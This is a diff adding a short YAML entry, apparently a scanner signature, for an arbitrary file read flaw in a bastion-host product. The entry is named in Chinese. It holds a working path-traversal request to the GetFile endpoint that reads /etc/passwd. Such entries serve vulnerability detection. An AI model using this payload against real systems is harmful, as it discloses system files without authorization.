@@ -1,0 +1,3 @@
+name: "某盟 SAS堡垒机 GetFile 任意文件读取漏洞"
+poc: "/webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd"
+status_code: 200
